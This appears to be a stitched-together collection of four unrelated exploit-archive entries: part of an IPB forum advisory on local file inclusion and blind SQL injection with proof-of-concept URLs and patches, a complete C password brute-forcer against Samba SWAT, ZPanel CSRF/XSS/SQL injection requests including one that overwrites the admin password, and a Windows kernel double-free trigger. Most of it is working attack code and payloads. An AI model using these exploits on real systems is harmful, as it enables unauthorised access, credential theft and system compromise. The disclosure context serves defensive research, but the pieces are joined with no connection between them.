170 | $classname = self::$class_dir . '_' . IPS_APP_COMPONENT . '_' . $module . '_manualResolver';

171  |         }
172  |         else if ( file_exists( $filepath . $section . '.php' ) )
173  |         {
174  |                 require_once( $filepath . $section . '.php' );
175  |         }
...  |


The require_once function on line 174 uses a variable $section to create a

path to a php file that is to be included. The variable is assigned the
following value:

line  | file: admin/sources/base/ipsRegistry.php

1654 | ipsRegistry::$current_section = ( ipsRegistry:: $request['section'] ) ? ipsRegistry::$request['section'] : '';

which as we know from the introduction comes from a user supplied variable

(via GET or POST method).


Although the whole $request array has been filtered out to prevent directory

traversal and arbitrary file inclusion it is possible to evade these

measures due to a bug in a function implementing the "friendly URLs" feature

introduced in version 3.0.0 of the IPB forum.

line | file: admin/sources/base/ipsRegistry.php
1188 | private static function _fUrlInit()
1189 | {
...  |
1195 |     if ( ipsRegistry::$settings['use_friendly_urls'] )
1196 |     {
...  |
...  |

1235 | $uri = $_SERVER['REQUEST_URI'] ? $_SERVER['REQUEST_URI'] : @getenv('REQUEST_URI');

1236 |
1237 |         $_toTest = $uri;        //( $qs ) ? $qs : $uri;
...  |
...  |
...  |
1306 |         //-----------------------------------------
1307 |         // If using query string furl, extract any
1308 |         // secondary query string.

1309 | // Ex: http://localhost/index.php?/path/file.html? key=value

1310 |         // Will pull the key=value properly
1311 |         //-----------------------------------------
1312 |
1313 |         if( substr_count( $_toTest, '?' ) > 1 )
1314 |         {

1315 | $_secondQueryString = substr( $_toTest, strrpos( $_toTest, '?' ) + 1 ); 1316 | $_secondParams = explode( '&', $_secondQueryString );

1317 |
1318 |                 if( count($_secondParams) )
1319 |                 {
1320 |                           foreach( $_secondParams as $_param )
1321 |                           {
1322 |                                  list( $k, $v )  = explode( '=', $_param );
1323 |
1324 |                                  $k      = IPSText::parseCleanKey( $k );
1325 |                                  $v      = IPSText::parseCleanValue( $v );
1326 |
1327 |                                  $_GET[ $k ]     = $v;
1328 |                                  $_REQUEST[ $k ] = $v;
1329 |                                  $_urlBits[ $k ] = $v;
1330 |
1331 |                                  ipsRegistry::$request[ $k ]     = $v;
1332 |                           }
1333 |                 }
1334 |         }
1335 | }
...  |

The above code allows for a secondary query string from which additional

variables are retrieved and saved in the $request array as well as $_GET and

$_REQUEST globals.
It takes a query string from a previously not cleaned global:

$_SERVER['REQUEST_URI'] and fails to check if the variables supplied in the

request URI string already exist in any of the arrays as well as to call
cleanGlobals function to sanitize the values.


A variable named 'section' can be passed in the secondary query string in order to bypass filtration of "../" and %00 sequences, effectively allowing to traverse directories and include any given php file within the system leading

to a local file inclusion attack.


Note: Omitting '.php' extension (to include arbitrary file like /etc/ passwd)

by using a NULL character will not be possible in this case as a

combination of %00 in the REQUEST_URI will not get decoded by the web server

automatically and there is no urldecode function to decode it before the
require_once call either.


Versions older than 3.0.4 have a different implementation of the friendly url

feature, but are also vulnerable in the same way.

2. Proof of concept.


This issue is trivial to exploit with a web browser and a known location of a

php file residing on the target system. Authorisation is not required.

For example, the following URL in case of IPB 3.0.4:


http://server-with-ipb-forum-3.0.4.com/forum/index.php?app=core&module=global&section=register&any= ? section = ../../../../../../../../../../../../../../../../../../../../../../../../../../tmp /inc

or the following in case of versions older than IPB 3.0.4:


http://server-with-ipb-forum-3.0.[0-3].com/forum/index.php? app=core&module=global&section=register/register/ page__section__ ../../../../../../../../../../../../../../../../../../../../../tmp/inc__

will result in including /tmp/inc.php file and executing code it contains.

V. SQL INJECTION VULNERABILITY
-------------------------

1. Description.


An SQL Injection attack is possible due to an insufficient sanitization in the

following function:

line | file: admin/applications/forums/sources/classes/moderate.php
1820 | /**
1821 |  * Create 'where' clause for SQL forum pruning
1822 |  *
1823 |  * @access      public
1824 |  * @return      boolean
1825 |  */

1826 | public function sqlPruneCreate( $forum_id, $starter_id="", $topic_state="", $post_min="", $date_exp="", $ignore_pin="" )

1827 | {
1828 |  $sql = 'forum_id=' . intval($forum_id);
1829 |
1830 |  if ( intval($date_exp) )
1831 |  {
1832 |          $sql .= " AND last_post < {$date_exp}";
1833 |  }
1834 |
1835 |  if ( intval($starter_id) )
1836 |  {
1837 |          $sql .= " AND starter_id={$starter_id}";
1838 |
1839 |  }
1840 |
1841 |  if ( intval($post_min) )
1842 |  {
1843 |          $sql .= " AND posts < {$post_min}";
1844 |  }
1845 |
1846 |  if ($topic_state != 'all')
1847 |  {
1848 |          if ($topic_state)
1849 |          {
1850 |                  $sql .= " AND state='{$topic_state}'";
1851 |          }
1852 |  }
1853 |
1854 |  if ( $ignore_pin != "" )
1855 |  {
1856 |          $sql .= " AND pinned=0";
1857 |  }
1858 |
1859 |
1860 |  return $sql;
1861 | }


All of the IF statements with intval() are to ensure that the arguments passed to the function are numeric before they are placed inside a WHERE clause of a

query.

Because of the way that intval() works, it is possible to fool the function by passing a string like: '1 OR sleep(5) '. In such case intval() will return a value of 1 thus satisfying the IF conditions and causing the string to be

placed inside the query.

The sqlPruneCreate function is used 2 times in a code that performs some
moderator's tasks. One invocation of it can be found in:


line | file: admin/applications/forums/modules_public/moderate/ moderate.php

2323 | protected function _pruneMove()
2324 | {
2325 |  //-----------------------------------------
2326 |  // Check
2327 |  //-----------------------------------------
2328 |
2329 |  $this->_resetModerator( $this->topic['forum_id'] );
2330 |
2331 |  $this->_genericPermissionCheck( 'mass_move' );
2332 |
2333 |  ///-----------------------------------------
2334 |  // SET UP
2335 |  //-----------------------------------------
2336 |

2337 | $pergo = intval( $this->request['pergo'] ) ? intval( $this->request['pergo'] ) : 50;

2338 |  $max            = intval( $this->request['max'] );
2339 |  $current        = intval($this->request['current']);
2340 |  $maxdone        = $pergo + $current;
2341 |  $tid_array      = array();
2342 |  $starter        = trim( $this->request['starter'] );
2343 |  $state          = trim( $this->request['state'] );
2344 |  $posts          = intval( $this->request['posts'] );
2345 |  $dateline       = intval( $this->request['dateline'] );
2346 |  $source         = $this->forum['id'];
2347 |  $moveto         = intval($this->request['df']);
2348 |  $date           = 0;
2349 |  $ignore_pin     = intval( $this->request['ignore_pin'] );
2350 |
2351 |  if( $dateline )
2352 |  {
2353 |          $date   = time() - $dateline*60*60*24;
2354 |  }
2355 |
2356 |  //-----------------------------------------
2357 |  // Carry on...
2358 |  //-----------------------------------------
2359 |

2360 | $dbPruneWhere = $this->modLibrary->sqlPruneCreate( $this- >forum['id'], $starter, $state, $posts, $date, $ignore_pin );

2361 |
2362 |  $this->DB->build( array(
2363 |                                                          'select'        => 'tid',
2364 |                                                          'from'          => 'topics',
2365 |                                                          'where'         => $dbPruneWhere,
2366 |                                                          'limit'         => array( 0, $pergo ),
2367 |                                          )               );
2368 |  $batch  = $this->DB->execute();
...  |

As we can see there are 2 variables that come from a user and are not

converted to a number before they are passed to the sqlPruneCreate function:

$starter and $state.

The second variable cannot be used in SQL Injection as it will be treated as a string and embraced with quotes by sqlPruneCreate. A string passed in $starter variable will be placed unquoted in the query as long as the first character is a number allowing a logged in moderator to perform an SQL Injection attack.

The vulnerability is somewhat tricky to exploit as there are quite a few

restrictions that make creating a successful sql attack vector difficult. Only the WHERE statement can be controlled, quotes are filtered, and UNION or sub selects are prohibited too (at least in case of a MySQL driver). To top it all, the results of the query are not outputted to the browser so it will have

to be a blind injection.

Nevertheless a crafty attacker might issue a series of requests that might

allow him to gain some information about the target system or even read

files from the disk depending on permissions granted to the db account that is used by the forum. Other attacks might also be possible when a database engine

other than MySQL is used.

2. Proof of concept.

If a logged in user with moderator privileges requests an URL like:

http://server-with-ipb-3.x.x-forum.com/forum/?app=forums&module=moderate&section=moderate&f=1&do=prune_move&df=3&pergo=50&dateline=0&state=open&ignore_pin=1&max=0&starter=1%20AND%20starter_id=1%20OR%20substr(version(),1,1)=5%20AND%20sleep(15)%20--%20skip%20&auth_key=c4276b77602767228faa9760eb4a5abd

in case of IPB 3.x, or:

http://server-with-ipb-2.x.x-forum.com/forum/?act=mod&f=1&CODE=prune_move&df=3&pergo=50&dateline=0&state=open&ignore_pin=1&max=0&starter=1%20AND%20starter_id=1%20OR%20substr(version(),1,1)=5%20AND%20sleep(16)%20--%20skip%20&auth_key=040c4a6e768d626b4c05a4bb0fbf315c

in case of IPB 2.x.

A query similar to:


SELECT tid FROM ibftopics WHERE forum_id=1 AND starter_id=1 AND starter_id=1 OR substr(version(),1,1)=5 AND sleep(15) -- skip AND state='open' AND pinned=0

LIMIT 0,50

will be run against the database.

The query will check if a major version of MySQL server is equal to 5. If that is the case a sleep function will be run which will slow down the page load by

15 seconds thus revealing the result of the query.


For this to work a valid auth_key needs to be supplied (that can be obtained by going to any of the forums, clicking Forum Management button and selecting Prune/Mass Move feature). Source ($f) and Destination ($df) forums parameters

in the URL might also need adjusting.

VI. BUSINESS IMPACT
-------------------------

The Local PHP File Inclusion vulnerability can be especially dangerous in a shared hosting environment. Even if server has been configured to prevent

users from reading each other's document roots (web server/PHP process

running in a context of the site's owner), an attacker that has an account on the same server as the targeted site could use the vulnerability to place a php file in a shared directory like /tmp and cause the IPB forum on the target

to execute his code thus gaining access equivalent to the owner of the
website.


The SQL Injection vulnerability is only a threat in case there are moderators

on the forum that cannot be fully trusted or if an attacker manages to
steal/guess their passwords. Possible risks in case of a successful
exploitation of this flaw have been described in the previous section.

VII. SYSTEMS AFFECTED
-------------------------

All of the IPB versions of the 3.x series (including the newest release of

3.0.4) are affected by the Local PHP File Inclusion and SQL Injection
vulnerabilities.


Probably most if not all of IPB releases of the 2.x series (including 2.3.6)

are affected by the SQL Injection vulnerability.

VIII. SOLUTION
-------------------------

Vendor has been informed about the vulnerabilities and should be releasing

patches soon.


I attach 2 patches for the current versions of both 2.x and 3.x series that

can be used as a temporary solution.

IPB 3.0.4 patch:


diff -Nprub ipb304/admin/applications/forums/sources/classes/ moderate.php ipb304-patched/admin/applications/forums/sources/classes/ moderate.php --- ipb304/admin/applications/forums/sources/classes/moderate.php 2009-10-08 16:34:50.000000000 +0100 +++ ipb304-patched/admin/applications/forums/sources/classes/ moderate.php 2009-11-29 01:01:49.000000000 +0000

@@ -1829,18 +1829,18 @@ class moderatorLibrary

                if ( intval($date_exp) )
                {
-                       $sql .= " AND last_post < {$date_exp}";
+                       $sql .= " AND last_post < ". intval($date_exp);
                }

                if ( intval($starter_id) )
                {
-                       $sql .= " AND starter_id={$starter_id}";
+                       $sql .= " AND starter_id=". intval($starter_id);

                }

                if ( intval($post_min) )
                {
-                       $sql .= " AND posts < {$post_min}";
+                       $sql .= " AND posts < ". intval($post_min);
                }

                if ($topic_state != 'all')

diff -Nprub ipb304/admin/sources/base/ipsRegistry.php ipb304-patched/ admin/sources/base/ipsRegistry.php --- ipb304/admin/sources/base/ipsRegistry.php 2009-10-08 16:34:24.000000000 +0100 +++ ipb304-patched/admin/sources/base/ipsRegistry.php 2009-11-29 00:57:13.000000000 +0000

@@ -479,6 +479,9 @@ class ipsRegistry


/* First pass of app set up. Needs to be BEFORE caches and member are set up */

                self::_fUrlInit();
+               IPSLib::cleanGlobals( $_GET );
+               IPSLib::cleanGlobals( $_REQUEST );
+               IPSLib::cleanGlobals( self::$request );

                self::_manageIncomingURLs();


IPB 2.3.6 patch:


diff -Nprub ipb236/sources/lib/func_mod.php ipb236-patched/sources/lib/ func_mod.php

--- ipb236/sources/lib/func_mod.php     2009-11-29 01:10:13.000000000 +0000

+++ ipb236-patched/sources/lib/func_mod.php 2009-11-29 01:19:23.000000000 +0000

@@ -1219,18 +1219,18 @@ class func_mod

                if ( intval($date_exp) )
                {
-                       $sql .= " AND last_post < $date_exp";
+                       $sql .= " AND last_post < ". intval($date_exp);
                }

                if ( intval($starter_id) )
                {
-                       $sql .= " AND starter_id=$starter_id";
+                       $sql .= " AND starter_id=". intval($starter_id);

                }

                if ( intval($post_min) )
                {
-                       $sql .= " AND posts < $post_min";
+                       $sql .= " AND posts < ". intval($post_min);
                }

                if ($topic_state != 'all')


Apply by going to your forum's directory and running the command:
patch -p1 < path_to_the_patch

IX. REFERENCES
-------------------------
http://www.invisionpower.com/products/board/

X. CREDITS
-------------------------
The vulnerabilities have been discovered by Dawid Golunski
golunski (at) onet (dot) eu

XI. REVISION HISTORY
-------------------------
December 4th, 2009: Initial release

XII. LEGAL NOTICES
-------------------------

The information contained within this advisory is supplied "as-is" with no

warranties or guarantees of fitness of use or otherwise. I accept no

responsibility for any damage caused by the use or misuse of this information.
// source: https://www.securityfocus.com/bid/1873/info

The Samba software suite is a collection of programs that implements the SMB protocol for unix systems, allowing you to serve files and printers to Windows, NT, OS/2 and DOS clients. This protocol is sometimes also referred to as the LanManager or Netbios protocol. Samba ships with a utility titled SWAT (Samba Web Administration Tool) which is used for remote administration of the Samba server and is by default set to run from inetd as root on port 701. Certain versions of this software ship with a vulnerability remote users can abuse to potentially leverage system access.

This problem in particular is that the loging facility with certain versions of SWAT will not log bad login attempts if the remote user enters a correct username but wrong password. This in effect allows the remote user to continuously attack the service guessing passwords without being logged or locked out.

/*

	Flyswatter.

	I must say, SWAT code is pretty ghetto.
	they 'protect against crackers' by
	sending bad auth errors if your user
	donesnt exist oh wait oops they forgot
	to have the same message if the user does
	exist but you the wrong password. I
	guess they kina missed the boat.

	Anyway, it works.

	Yeah, the base64_encode() is pretty
	damn ghetto. Oh well, at least its
	readable.

	Miah rules. Thanx for the ideas on this

	-dodeca-T
	t12@uberhax0r.net

	PS: If you have ant problems, I'd
	say your best bet is to live in harmony
	with the little creatures. Remeber,
	they just clean up after your messes.

*/

#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>

#define SWAT_PORT 901
#define MAX_NAME_SIZE 16
#define MAX_PASS_SIZE 16
#define CHECK_PASSWORD "centerfield"
#define USER_AGENT "super-hyper-alpha-pickle-2000"

struct VALID_NAMES  {
					 char *name;
					 struct VALID_NAMES *next;
					};

struct VALID_NAMES *add_to_names(struct VALID_NAMES *list, char *name)
{
 list->name=(char *)malloc(MAX_NAME_SIZE);
 memcpy(list->name, name, MAX_NAME_SIZE);
 list->next=(struct VALID_NAMES *)malloc(sizeof(struct VALID_NAMES));
 list=list->next;
 memset(list, 0, sizeof(struct VALID_NAMES));
 return(list);
}

void chop(char *str)
{
 int x;

 for(x=0;str[x]!='\0';x++)
	 if(str[x]=='\n')
		{
		 str[x]='\0';
		 return;
		}
 return;
}

char *base64_encode(char *str)
{
 char *b64="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

 int x, y;
 unsigned char *output;

 output=(char *)malloc(strlen(str)*2);
 memset(output, 0, strlen(str)*2);

 for(x=0, y=0;x<strlen(str)-(strlen(str)%3) ;x+=3, y+=4)
	{
 	 output[y] = str[x] >> 2;

	 output[y+1] = str[x] << 6;
 	 output[y+1] = output[y+1] >> 2;
     output[y+1] = output[y+1] | (str[x+1] >> 4);

	 output[y+2] = str[x+1] << 4;
	 output[y+2] = output[y+2] >> 2;
	 output[y+2] = output[y+2] | (str[x+2] >> 6);

	 output[y+3] = str[x+2] << 2;
	 output[y+3] = output[y+3] >> 2;
	}

 if(strlen(str)%3 == 1)
	{
	 output[y]=str[x] >> 2;
	 output[y+1]=str[x] << 6;
	 output[y+1]=output[y+1] >> 2;
	 output[y+2]=64;
	 output[y+3]=64;
	}

 if(strlen(str)%3 == 2)
	{
	 output[y]=str[x] >> 2;
	 output[y+1]=str[x] << 6;
	 output[y+1]=output[y+1] >> 2;
	 output[y+1]=output[y+1] | (str[x+1] >> 4);
	 output[y+2]=str[x+1] << 4;
	 output[y+2]=output[y+2] >> 2;
	 output[y+3]=64;
	}

 for(x=0 ; output[x] != 0 ; x++)
	 output[x] = b64[output[x]];

 output[x+1]='\0';
 return(output);
}

int check_user(char *name, char *pass, struct hostent *he)
{
 char buf[8192]="";
 char buf2[1024]="";
 int s;
 struct sockaddr_in s_addr;

 memset(buf, 0, sizeof(buf));
 memset(buf2, 0, sizeof(buf2));

 s_addr.sin_family = PF_INET;
 s_addr.sin_port = htons(SWAT_PORT);
 memcpy((char *) &s_addr.sin_addr, (char *) he->h_addr,
        sizeof(s_addr.sin_addr));

 if((s=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
    {
     fprintf(stderr, "cannot create socket\n");
     exit(-1);
    }

 if(connect(s, (struct sockaddr *) &s_addr, sizeof(s_addr))==-1)
    {
     fprintf(stderr, "cannot connect\n");
     exit(-1);
    }

 chop(name);
 chop(pass);
 sprintf(buf2, "%s:%s", name, pass);
 sprintf(buf, "GET / HTTP/1.0\n"
              "Connection: Keep-Alive\n"
              "User-Agent: %s\n"
              "Authorization: Basic %s\n\n", USER_AGENT, base64_encode(buf2));

 if(send(s, buf, strlen(buf), 0) < 1)
    {
     perror("send: ");
     exit(1);
    }

 memset(buf, 0, sizeof(buf));
 if(recv(s, buf, sizeof(buf), 0) < 1)
    {
     perror("recv: ");
     exit(1);
    }

 buf[sizeof(buf)]='\0';

 if(strstr(buf, "HTTP/1.0 401 Authorization Required") != NULL)
    {
	 close(s);
     return 1;
    }
 else if(strstr(buf, "HTTP/1.0 401 Bad Authorization") != NULL)
    {
	 close(s);
     return 0;
    }
 else if(strstr(buf, "HTTP/1.0 200 OK") != NULL)
	{
	 close(s);
	 return 2;
	}
 else
    {
     printf("Unknown result: %s\n", buf);
     exit(1);
    }
}

void usage(void)
{
 printf("\nUsage: flyswatter [-a] -t <target> -n <namefile> -p <passwordfile>\n");
 printf("\n\t-a: Do not verify that users exist.\n");
 exit(1);
}

int main(int argc, char** argv)
{
 int x, y, z;

 int s;
 char buf[MAX_NAME_SIZE]="";
 FILE *pfile, *nfile;
 struct hostent *he;
 struct VALID_NAMES *valid_names;
 struct VALID_NAMES *list_walk;

 int tryall=0;
 char target[1024]="";
 char namefile[512]="";
 char passwordfile[512]="";

 valid_names=(struct VALID_NAMES *)malloc(sizeof(struct VALID_NAMES));
 list_walk=valid_names;
 memset(valid_names, 0, sizeof(struct VALID_NAMES));

 if(argc<2)
	 usage();

 for(x=1;x<argc;x++)
	{
	 if(argv[x][0]=='-')
		 for(y=1;y<strlen(argv[x]);y++)
			 switch(argv[x][y])
				{
				 case 'a':
					tryall=1;
					break;
				 case 'h':
					usage();
					break;
				 case 't':
					if(x+1<argc)
				 		strncpy(target, argv[x+1], sizeof(target));
					else
						{
						 fprintf(stderr, "Must Specify target\n");
						 exit(1);
						}
				 	break;
			 	 case 'n':
					if(x+1<argc)
						strncpy(namefile, argv[x+1], sizeof(namefile));
					else
						{
						 fprintf(stderr, "Must Specify namefile\n");
						 exit(1);
						}
					break;
				 case 'p':
					if(x+1<argc)
						strncpy(passwordfile, argv[x+1], sizeof(passwordfile));
					else
						{
						 fprintf(stderr, "Must Specify passwordfile\n");
						 exit(1);
						}
					break;
				 default:
					fprintf(stderr, "Invalid option\n");
					exit(1);
					break;
				}
	}

 if(strncmp(target, "", sizeof(target))==0)
	{
	 fprintf(stderr, "Must specify target\n");
	 exit(1);
	}

 if(strncmp(namefile, "", sizeof(target))==0)
	{
	 fprintf(stderr, "Must specify namefile\n");
	 exit(1);
	}

 if((nfile=fopen(namefile, "r"))==NULL)
	{
	 fprintf(stderr, "Cannot open %s\n", namefile);
	 exit(1);
	}

 if(strcmp(passwordfile, "")!=0)
	if((pfile=fopen(passwordfile, "r"))==NULL)
	{
	 fprintf(stderr, "Cannot open %s\n", passwordfile);
	 exit(1);
	}

 printf("\n");
 if(tryall==1)
	printf("-Not verifying usenames\n");
 printf("-Namefile: %s\n", namefile);
 printf("-Passwordfile: %s\n", passwordfile);
 printf("-Target: %s\n", target);

 if((he=gethostbyname(target)) == NULL)
    {
     fprintf(stderr, "\t*Invalid target\n");
     usage();
    }

 if(tryall==0)
	 while(fgets(buf, sizeof(buf), nfile))
		{
	 	 chop(buf);
	 	 if(check_user(buf, CHECK_PASSWORD, he) == 1)
			{
				printf("User \"%s\" exists!\n", buf);
				list_walk=add_to_names(list_walk, buf);
			}
	 	}
 else
	 while(fgets(buf, sizeof(buf), nfile))
		{
		 chop(buf);
		 list_walk=add_to_names(list_walk, buf);
		}

 if(strcmp(passwordfile, "")==0)
	{
	 exit(0);
	 printf("Finished.\n");
	}

 while(valid_names->next != 0)
	{
	 fseek(pfile, 0, SEEK_SET);
	 while(fgets(buf, sizeof(buf), pfile)!=NULL)
		{
		 if(check_user(valid_names->name, buf, he)==2)
			printf("valid username/password: %s:%s\n",
				   valid_names->name, buf);
		}
	 valid_names=valid_names->next;
	}

 printf("Finished.\n");
 exit(0);
}
# Exploit Title: ZPanel <= 10.0.1 CSRF, XSS, SQLi, Password Reset
# Date: 04/11/2012
# Exploit Author: pcsjj
# Vendor Homepage: http://www.zpanelcp.com/
# Version: 10.0.1
# Software Link: http://sourceforge.net/projects/zpanelcp/files/latest/download
# Downloads: 90,382
# CVE : CVE-2012-5683 (CSRF), CVE-2012-5684 (XSS), CVE-2012-5685(SQL Injection), CVE-2012-5686 (Password Reset)
# I'm going to guess there are some more here.

# 10/30/2012 - Contacted  developers.
# 10/31/2012 - Developer states preference for reporting through bug tracker.
# 11/04/2012 - Developer confirms preference for reporting through bug tracker.
# 11/04/2012 - Vulnerability disclosed in bug tracker.

# Insufficient CSRF protection (CVE-2012-5683)
# All sensitive functions are lacking CSRF protection. One example below is
a request showing no authorization token is required for the creation of a
FTP user called "fun". This could also be used to deliver both XSS
(CVE-2012-5684) and SQLi (CVE-2012-5685) examples below.
#

http://192.168.1.100/?module=ftp_management&action=CreateFTP

POST /zpanel/?module=ftp_management&action=CreateFTP HTTP/1.1
Host: 192.168.1.100
Referer: http://192.168.1.100/?module=ftp_management
Cookie: PHPSESSID=4rcq0qoqcdp5f3e65jiuvsujd2
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
inFTPUsername=fun&inPassword=fun&inAccess=RW&inAutoHome=2&inDestination=&inDestination=&inSubmit=

# Persistent XSS (CVE-2012-5684)
# The "inFullname" parameter is vulnerable to XSS. User's real name is not
being sanitized as it displayed within the control panel.
#

http://192.168.1.100/zpanel/?module=my_account&action=UpdateAccountSettings

POST /?module=my_account&action=UpdateAccountSettings HTTP/1.1
Host: 192.168.1.100
Referer:
http://192.168.1.100/zpanel/?module=my_account&action=UpdateAccountSettings
Cookie: PHPSESSID=4rcq0qoqcdp5f3e65jiuvsujd2
Content-Type: application/x-www-form-urlencoded
Content-Length: 143
inFullname=Admin%3Cscript%3Ealert%28/fun/%29%3C%2Fscript%3E&inEmail=admin%
40example.com&inPhone=101&inLanguage=en&inAddress=Home&inPostalCode=101

# SQL Injection (CVE-2012-5685)
# "inEmailAddress" parameter is vulnerable to SQL injection. Since the
injection point is in an UPDATE statement its trivial to manipulate the
content of the database. For instance the zadmin password could be changed
to password.(5f4dcc3b5aa765d61d8327deb882cf99)
#

http://192.168.1.100/?module=manage_clients&action=UpdateClient

POST /?module=manage_clients&action=UpdateClient HTTP/1.1
Host: 192.168.182.128
Referer: http://192.168.1.100/?module=manage_clients&show=Edit&other=5
Cookie: PHPSESSID=4rcq0qoqcdp5f3e65jiuvsujd2
Content-Type: application/x-www-form-urlencoded
Content-Length: 257
inGroup=2&inPackage=2&inFullName=reseller&inEmailAddress=%27%2C+ac_pass_vc%3D%275f4dcc3b5aa765d61d8327deb882cf99%27%2C+ac_user_vc%3D%27zadmin%27+WHERE+ac_id_pk%3D1%3B--&inAddress=&inPostCode=&inPhone=101&inNewPassword=&inEnabled=1&inClientID=5&inSubmit=Save

# One more sqli example
# A user can extract data from db though an UPDATE statement by using a
subquery. As long as we update a field that is displayed back to us. To
reproduce this example you need to know your ClientID which can be found in
the referring page's url as the value of "other". In this example we use
the email field to hold the result of the subquery. Usually you can't
select from the table you're updating but by creating a temporary table
called "fun" we can avoid that. Using group_concat we get all columns and
all rows as a single string so that it all fits nicely in a single field.
#

http://192.168.1.100/?module=manage_clients&action=UpdateClient

POST /?module=manage_clients&action=UpdateClient HTTP/1.1
Host: 192.168.1.100
Referer: http://192.168.1.100/?module=manage_clients&show=Edit&other=5
#<!---- 5 is the Client ID or ac_id_pk
Cookie: PHPSESSID=4rcq0qoqcdp5f3e65jiuvsujd2
Content-Type: application/x-www-form-urlencoded
Content-Length: 335
inGroup=2&inPackage=2&inFullName=reseller&inEmailAddress=reseller%
40example.com
%27%2C+ac_email_vc%3D%28select+group_concat%28ac_user_vc%2C+ac_pass_vc%29+from+%28select+*+from+x_accounts%29+as+fun%29+where+ac_id_pk%3D%275%27%3B--&inAddress=&inPostCode=&inPhone=%2B44%281473%29+000+000&inNewPassword=&inEnabled=1&inClientID=5&inSubmit=Save

# Password Reset Weakness, Insufficient entropy (CVE-2012-5686)
# "randomkey" is not sufficiently random. By knowing server time an
attacker could reset a password and guess the key within a relatively low
number of requests.  If the attacker can receive a password reset email for
any account on the system (demo account?) the number of attempts required
to guess reset key for another user (zadmin) can be greatly reduced.  Since
the zadmin default admin account is "hard coded" it is especially at risk
to this password reset weakness. If you change zadmin username in the
zpanel_core db my experience is that you cannot load zpanel control panel.
#

# ZPanel source code for [INSTALL_DIR]/inc/init.inc.php
 38    $randomkey = sha1(microtime());
 46      $zdbh->exec("UPDATE x_accounts SET ac_resethash_tx = '" .
$randomkey . "' WHERE ac_id_pk=" . $result['ac_id_pk'] . "");
 50      $phpmailer->Body = "Hi " . $result['ac_user_vc'] . ",
 51     You or somebody pretending to be you has requested a password reset
link to be sent for your web hosting control panel login at: " .
ctrl_options::GetOption('cp_url') . "
 52    If you wish to proceed with the password reset on your account
please use this link below to be taken to the password reset page.
 53    http://" . ctrl_options::GetOption('zpanel_domain') . "/?resetkey="
. $randomkey . "
 54     ";
// source: https://www.securityfocus.com/bid/38044/info

// Microsoft Windows is prone to a local privilege-escalation vulnerability that occurs in the kernel.

// An attacker can exploit this issue to execute arbitrary code with kernel-level privileges. Successful exploits will result in the complete compromise of affected computers. Failed exploit attempts will cause a denial of service.

// --------------------------------------------------------
// Windows NtFilterToken() Double Free Vulnerability
// ----------------------------- taviso@sdf.lonestar.org ------------
//
// INTRODUCTION
//
//      NtFilterToken() will jump to a cleanup routine if it failed to capture
//      the arguments specified due to pathological TOKEN_GROUP parameter. This
//      cleanup routine assumes a pointer passed to SeCaptureSidAndAttributesArray()
//      will be NULL if it fails, and attempts to release it otherwise.
//
//      Unfortunately there is a codepath where SeCaptureSidAndAttributesArray()
//      allocates a buffer, releases it on error, but then does not set it to
//      NULL. This causes NtFilterToken() to incorrectly free it again.
//
// IMPACT
//
//      This is probably exploitable (at least on MP kernels) to get ring0 code
//      execution, but you would have to get the released buffer re-allocated
//      during a very small window and you only get one attempt (the kernel
//      will bugcheck if you dont win the race).
//
//      Although technically this is a local privilege escalation, I don't think
//      it's possible to create a reliable exploit. Therefore, It's probably
//      safe to treat this as if it were a denial of service.
//
//      Interestingly, Microsoft are big proponents of static analysis and this
//      seems like a model example of a statically discoverable bug. I would
//      guess they're dissapointed they missed this one, it would be fun to
//      know what went wrong.
//
//      This vulnerability was reported to Microsoft in October, 2009.
//
// CREDIT
//
//      This bug was discovered by Tavis Ormandy <taviso@sdf.lonestar.org>.
//

#include <windows.h>

PVOID AllocBufferOnPageBoundary(ULONG Size);

int main(int argc, char **argv)
{
    SID *Sid;
    HANDLE NewToken;
    FARPROC NtFilterToken;
    PTOKEN_GROUPS Restricted;

    // Resolve the required routine.
    NtFilterToken = GetProcAddress(GetModuleHandle("NTDLL"), "NtFilterToken");

    // Allocate SID such that touching the following byte will AV.
    Sid             = AllocBufferOnPageBoundary(sizeof(SID));
    Restricted      = AllocBufferOnPageBoundary(sizeof(PTOKEN_GROUPS) + sizeof(SID_AND_ATTRIBUTES));

    // Setup SID, SubAuthorityCount is the important field.
    Sid->Revision           = SID_REVISION;
    Sid->SubAuthority[0]    = SECURITY_NULL_RID;
    Sid->SubAuthorityCount  = 2;

    // Respect my authority.
    CopyMemory(Sid->IdentifierAuthority.Value, "taviso", sizeof Sid->IdentifierAuthority.Value);

    // Setup the TOKEN_GROUPS structure.
    Restricted->Groups[0].Attributes    = SE_GROUP_MANDATORY;
    Restricted->Groups[0].Sid           = Sid;
    Restricted->GroupCount              = 1;

    // Trigger the vulnerabilty.
    NtFilterToken(INVALID_HANDLE_VALUE,
                  0,
                  NULL,
                  NULL,
                  Restricted,
                  &NewToken);

    // Not reached
    return 0;
}

#ifndef PAGE_SIZE
# define PAGE_SIZE 0x1000
#endif

// This is a quick routine to allocate a buffer on a page boundary. Simply
// VirtualAlloc() two consecutive pages read/write, then use VirtualProtect()
// to set the second page to PAGE_NOACCESS.
//
//          sizeof(buffer)
//                |
//              <-+->
//  +----------------+----------------+
//  | PAGE_READWRITE | PAGE_NOACCESS  |
//  +----------------+----------------+
//              ^     ^
//              |     |
//   buffer[0] -+     +- buffer[size]
//
// No error checking for simplicity, whatever :-)
//
PVOID AllocBufferOnPageBoundary(ULONG Size)
{
    ULONG GuardBufSize;
    ULONG ProtBits;
    PBYTE GuardBuf;

    // Round size requested up to the next multiple of PAGE_SIZE
    GuardBufSize = (Size + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);

    // Add one page to be the guard page
    GuardBufSize = GuardBufSize + PAGE_SIZE;

    // Map this anonymous memory
    GuardBuf = VirtualAlloc(NULL,
                            GuardBufSize,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE);

    // Make the final page NOACCESS
    VirtualProtect(GuardBuf + GuardBufSize - PAGE_SIZE,
                   PAGE_SIZE,
                   PAGE_NOACCESS,
                   &ProtBits);

    // Calculate where pointer should be, so that touching Buffer[Size] AVs.
    return GuardBuf + GuardBufSize - PAGE_SIZE - Size;
}
